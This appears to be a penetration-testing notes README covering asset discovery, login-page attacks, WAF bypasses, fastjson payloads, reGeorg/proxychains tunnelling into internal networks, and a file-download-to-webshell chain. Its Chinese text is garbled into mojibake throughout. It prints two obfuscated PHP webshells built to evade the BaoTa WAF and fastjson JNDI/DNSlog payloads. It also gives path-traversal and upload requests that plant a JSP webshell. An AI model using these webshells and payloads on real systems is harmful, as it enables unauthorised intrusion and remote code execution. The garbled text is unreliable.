# å¯¼èˆª
- ğŸ´â€â˜  [æ‰“ç‚¹-éšè—èµ„äº§æ¢æµ‹-hostç¢°æ’](https://github.com/0wlsec/pentestNote/blob/main/README.md#%E9%9A%90%E8%97%8F%E8%B5%84%E4%BA%A7%E6%8E%A2%E6%B5%8B-host%E7%A2%B0%E6%92%9E)
- ğŸ´â€â˜  ["ç™»å½•æ¡†" æ”»å‡»é¢](https://github.com/0wlsec/pentestNote/blob/main/README.md#%E7%99%BB%E5%BD%95%E6%A1%86-%E6%94%BB%E5%87%BB%E9%9D%A2)
- ğŸ´â€â˜  [å®å¡”é˜²ç«å¢™ Bypass](https://github.com/0wlsec/pentestNote/blob/main/README.md#%E5%AE%9D%E5%A1%94%E9%98%B2%E7%81%AB%E5%A2%99-bypass)
- ğŸ´â€â˜  [fastjson bypass æŸWAF](https://github.com/0wlsec/pentestNote/blob/main/README.md#fastjson-bypass-%E6%9F%90waf)
- ğŸ´â€â˜  [å†…ç½‘-ä»£ç†(reGeorg+Proxifier+Win)](https://github.com/0wlsec/pentestNote/blob/main/README.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BB%A3%E7%90%86regeorgproxifierwin)
- ğŸ´â€â˜  [å†…ç½‘-ä»£ç†(reGeorg+proxychains+Linux)](https://github.com/0wlsec/pentestNote/blob/main/README.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BB%A3%E7%90%86regeorgproxychainslinux))
- ğŸ´â€â˜  [å†…ç½‘-ä»£ç†(ssocksåå‘ä»£ç†)](https://github.com/0wlsec/pentestNote/blob/main/README.md#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E4%BB%A3%E7%90%86regeorgproxychainslinux))
- ğŸ´â€â˜  [æ‰“ç‚¹-Druidæœªæˆæƒè®¿é—®->RCE](https://github.com/0wlsec/pentestNote/blob/main/README.md#druid%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-rce)
- ğŸ´â€â˜  [æ‰“ç‚¹-ä»»æ„æ–‡ä»¶ä¸‹è½½->RCE](https://github.com/0wlsec/pentestNote/blob/main/README.md#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD-rce)
- ğŸ´â€â˜  [pocsuite3ä»£ç†ä½¿ç”¨](https://github.com/0wlsec/pentestNote/blob/main/README.md#pocsuite3%E4%BB%A3%E7%90%86%E9%A3%9F%E7%94%A8)


### éšè—èµ„äº§æ¢æµ‹-hostç¢°æ’

step1: æœé›†å­åŸŸå 

step2: æœé›†IP (ç›®æ ‡åŸŸåå†å²è§£æIP)

step3: ä»¥IP+åŸŸåçš„å½¢å¼è¿›è¡Œç¢°æ’


ä¼ é€ï¼š
```
https://github.com/fofapro/Hosts_scan 
https://github.com/shmilylty/OneForAll  
https://fofa.so/
https://site.ip138.com/
https://ipchaxun.com/
https://securitytrails.com/list/apex_domain/  # å­åŸŸå
```
å‚è€ƒï¼š
```
https://www.cnblogs.com/Rain99-/p/13756032.html
https://xz.aliyun.com/t/9590
```
### "ç™»å½•æ¡†" æ”»å‡»é¢
- ç”¨æˆ·åæšä¸¾
- ç©ºå£ä»¤
- å¼±å£ä»¤
- ç™»å½•è®¤è¯ç»•è¿‡
- æš´åŠ›ç ´è§£
- å›¾å½¢éªŒè¯ç ç»•è¿‡
- çŸ­ä¿¡éªŒè¯ç ç»•è¿‡ï¼ˆæˆ–çˆ†ç ´ï¼‰
- çŸ­ä¿¡è½°ç‚¸ï¼ˆé‡æ”¾ï¼‰
- é‚®ç®±è½°ç‚¸ï¼ˆé‡æ”¾ï¼‰
- å¯†ç æ˜æ–‡ä¼ è¾“
- SQLæ³¨å…¥ï¼ˆä¸‡èƒ½å¯†ç ï¼‰
- ä»»æ„ç”¨æˆ·å¯†ç é‡ç½®
- ç›®å½•éå†
- æ•æ„Ÿä¿¡æ¯æ³„éœ²
- æ¡†æ¶æ¼æ´ï¼ˆshiroï¼‰
- XSS

### å®å¡”é˜²ç«å¢™ Bypass
- ä¼ å‚æ–¹å¼ $_COOKIE
- ç¼–ç ç»•è¿‡æµé‡æ£€æµ‹

*3é‡ base64 å¤±è´¥*ï¼ˆä¼¼ä¹æ£€æµ‹äº†å…³é”®å­—â€˜base64â€™ï¼‰
![image](https://user-images.githubusercontent.com/55024146/119949340-5c6fda80-bfcc-11eb-84bb-4d2543af7bea.png)

*3é‡ urlç¼–ç  æˆåŠŸ*

![image](https://user-images.githubusercontent.com/55024146/119950026-08192a80-bfcd-11eb-8197-3d6d695b4681.png)

è´´ä¸¤ä¸ªğŸ(`ä¾µåˆ `)

demo1:
```php
<?php
$p=$_COOKIE;(count($p)==23&&in_array(gettype($p).count($p),$p))?(($p[59]=$p[59].$p[72])&&($p[91]=$p[59]($p[91]))&&($p=$p[91]($p[90],$p[59]($p[31])))&&$p()):$p;
?>
```
demo2:
```php
<?php
$poc ="axsxsxexrxt";
$poc_1 = explode("x", $poc);
$poc_2 = $poc_1[0] . $poc_1[1] . $poc_1[2] . $poc_1[3]. $poc_1[4]. $poc_1[5];
$poc_2(urldecode(urldecode(urldecode($_REQUEST[x]))));
?>
```

### fastjson bypass æŸWAF
demo
```
{{"@type":"java.net.URL","val":"http://.dnslog.cn"}:0
```
![image](https://user-images.githubusercontent.com/55024146/119951579-aeb1fb00-bfce-11eb-87aa-67f3dbbd7fb8.png)

bypass
```
{"@type":\b"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://127.0.0.1:9999","autoCommit":true}}
```
### å†…ç½‘æ¸—é€-ä»£ç†(reGeorg+Proxifier+Win)

```
# reGeorg
https://github.com/sensepost/reGeorg
# Proxifier
https://pc.qq.com/detail/13/detail_10593.html
```
ä¸Šä¼ å¯¹åº”çš„tunnelæ–‡ä»¶ï¼Œå¦‚å›¾å³å¯

![image](https://user-images.githubusercontent.com/55024146/122792344-aa86ae00-d2ec-11eb-82fd-7b9102a0d501.png)

ç„¶åattack-pc æ‰§è¡Œ
```python
python2 reGeorgSocksProxy.py -u http://192.168.10.211/tunnel.nosocket.php -p 8888
```
proxifieré…ç½®ä»£ç†å¦‚ä¸‹
- 127.0.0.1:8888
- socks5

### å†…ç½‘æ¸—é€-ä»£ç†(reGeorg+proxychains+Linux)
```
# reGeorg
https://github.com/sensepost/reGeorg
# Proxifier
https://pc.qq.com/detail/13/detail_10593.html
```
ä¸Šä¼ å¯¹åº”çš„tunnelæ–‡ä»¶ï¼Œå¦‚å›¾å³å¯

![image](https://user-images.githubusercontent.com/55024146/122792344-aa86ae00-d2ec-11eb-82fd-7b9102a0d501.png)

ç„¶åattack-pc æ‰§è¡Œ
```python
python2 reGeorgSocksProxy.py -u http://192.168.10.211/tunnel.nosocket.php -p 4561
```
proxychainsé…ç½®å¦‚ä¸‹ï¼š
- vim /etc/proxychains.conf

![image](https://user-images.githubusercontent.com/55024146/122793053-56c89480-d2ed-11eb-9d5d-3dbcd204a6d7.png)

demo:
ä½¿ç”¨proxychainsä»£ç†è¿œç¨‹ç™»å½•windows
```
proxychains rdesktop -g 1440x900 172.17.17.7:3389 //-gåé¢ä»£è¡¨è¦ä½¿ç”¨çš„åˆ†è¾¨ç‡
```

### å†…ç½‘æ¸—é€-ä»£ç†(ssocksåå‘ä»£ç†)
```
https://sourceforge.net/projects/ssocks/
```
å‚è€ƒï¼š
https://apt404.github.io/2016/09/12/ssocks/

### Druidæœªæˆæƒè®¿é—®->RCE
- ç›®å½•æ‰«æ  /druid/index.html
- ä¿¡æ¯æ³„éœ²  Session & URI(åå°)
- ä¼ªé€ sessionè¿›å…¥åå°ï¼Œå‘ç°ä¸Šä¼ ç‚¹
```
POST /index HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Content-Length: 0
Origin: 
Referer: 
Cookie: JSESSIONID=589A43F0FAxxxxxx2A4403C143A77A51
```
- ç»•è¿‡å‰ç«¯jséªŒè¯å®ç°ä»»æ„æ–‡ä»¶ä¸Šä¼ 
### ä»»æ„æ–‡ä»¶ä¸‹è½½->RCE
- å‘ç°1å¤„æ–‡ä»¶ä¸‹è½½çš„åœ°æ–¹
```
GET /download?module=&method=Download&name=test.zip&filepath=doc/test.zip HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate
```
- burpæŠ“åŒ…ï¼Œæ¢ä¸ºpostè¯·æ±‚å‘ç°å¯ä¸‹è½½ä»»æ„æ–‡ä»¶
```
POST /download HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate

module=&method=Download&name=test.zip&filepath=../webapps/WEB-INF/web.xml
```
- è¯»å–æ—¥å¿—æ–‡ä»¶åˆ¤æ–­classæ–‡ä»¶çš„ä½ç½®
```
POST /download HTTP/1.1
Host: 1.1.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/xhtml+xml,application/xml
Accept-Encoding: gzip, deflate

module=&method=Download&name=test.zip&filepath=../logs/catalina.2021-xx-xx.log
```
- ä¸‹è½½classæ–‡ä»¶åˆ†æå®¡è®¡,åœ¨/downloadè·¯ç”±ä¸‹çš„servletå­˜åœ¨ä¸Šä¼ æ–‡ä»¶å’Œæ›´æ–°æ–‡ä»¶çš„æ“ä½œ
  - é¦–å…ˆä¸Šä¼ ä¸€ä¸ªç©ºæ–‡ä»¶åˆ°webç›®å½•
  ```
  POST /download HTTP/1.1
  Host: 1.1.1.1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
  Accept: text/html,application/xhtml+xml,application/xml
  Accept-Encoding: gzip, deflate

  module=&method=upload&txtFile_Name=x.jsp&home=/&filepath=../webapps/
  ```

  - æ›´æ–°æ–‡ä»¶å†…å®¹ä¸ºwebshell
  ```
  POST /download HTTP/1.1
  Host: 1.1.1.1
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
  Accept: text/html,application/xhtml+xml,application/xml
  Accept-Encoding: gzip, deflate

  module=&method=updateContent&home=/&filepath=../webapps/x.jsp&content=xxxxxx
  ```
- æˆåŠŸçªç ´ç½‘ç»œè¾¹ç•Œè¿›å…¥å†…ç½‘

### pocsuite3ä»£ç†é£Ÿç”¨
å‘½ä»¤è¡Œï¼š
```shell
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy socks5://1.2.3.4:5678
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy socks4://1.2.3.4:5678
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy http://1.2.3.4:5678
python cli.py -r pocs\rce.py -u http://127.0.0.1/ --verify --proxy https://1.2.3.4:5678
```
proxierï¼š
![image](https://user-images.githubusercontent.com/55024146/125926069-5b29debf-31b2-4642-8f24-aea0d019e3c8.png)

